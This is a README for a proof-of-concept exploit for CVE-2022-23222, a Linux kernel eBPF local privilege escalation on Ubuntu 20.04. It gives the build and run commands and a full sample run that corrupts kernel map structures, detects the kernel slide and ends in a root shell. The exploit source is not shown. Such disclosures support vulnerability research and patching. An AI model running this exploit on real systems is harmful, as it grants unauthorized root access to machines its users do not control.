# Proof of Concept Exploit Code for CVE-2022-23222
This is a POC for CVE 2022-23222, a Local Privilege Escalation vulnerability.
This POC was written for Ubuntu 20.04 with kernel version 5.13.0-27-generic, but other kernel versions are also vulnerable.
For a detailed analysis of the exploit, please read our [write-up](https://www.pentera.io/blog/the-good-bad-and-compromisable-aspects-of-linux-ebpf/).
## Usage
Make sure `libbpf` is installed as it is a requirement for the exploit.
To compile the POC, run the following command:
```
make
```
To execute the expolit, run the following executable:
```
./exploit
[+] eBPF enabled, ringbuf created!
[!] staring to create new maps until we get two consecutive maps
[+] created map 1
[+] generated random value: f2dec021c4bb41b7
[+] created map 2
[+] generated random value: 3d247a46c6ed75e4
[+] two new maps created!
[+] value read from slab: 0
[+] value read from slab: 0
[+] created map 3
[+] generated random value: 3214fb323b506766
[+] created map 4
[+] generated random value: 909d65f4ebe3bc9a
[+] eBPF enabled, maps created!
[+] value read from slab: 0
[+] value read from slab: 0
[+] created map 5
[+] generated random value: 6bd18dfb510e1f0f
[+] created map 6
[+] generated random value: 8bd7c8e518387c75
[+] eBPF enabled, maps created!
[+] value read from slab: 3214fb323b506766
[+] aligned map found in map 2
1: 6bd18dfb510e1f0f
2: 3214fb323b506766
[+] closing unnecessary_maps
[+] found map address: 0xffff94d44cf48800
[+] overriding map_ops
[+] detected kernel slide 11200000
[+] setting spin_lock = 0
[+] setting max_entries = 0xffffffff
[+] setting map_type = BPF_MAP_TYPE_STACK
[+] getting root
[+] iterating over task_struct list to find out process
[+] got it!
[+] cleaning up
[+] getting shell!
#
```
## DISCLAIMER
The code described in this advisory (the “Code”) is provided on an “as is” and
“as available” basis and may contain bugs, errors, and other defects. You are
advised to safeguard important data and to use caution. By using this Code, you
agree that Pentera shall have no liability to you for any claims in
connection with the Code. Pentera disclaims any liability for any direct,
indirect, incidental, punitive, exemplary, special or consequential damages,
even if Pentera or its related parties are advised of the possibility of
such damages. Pentera undertakes no duty to update the Code or this
advisory.
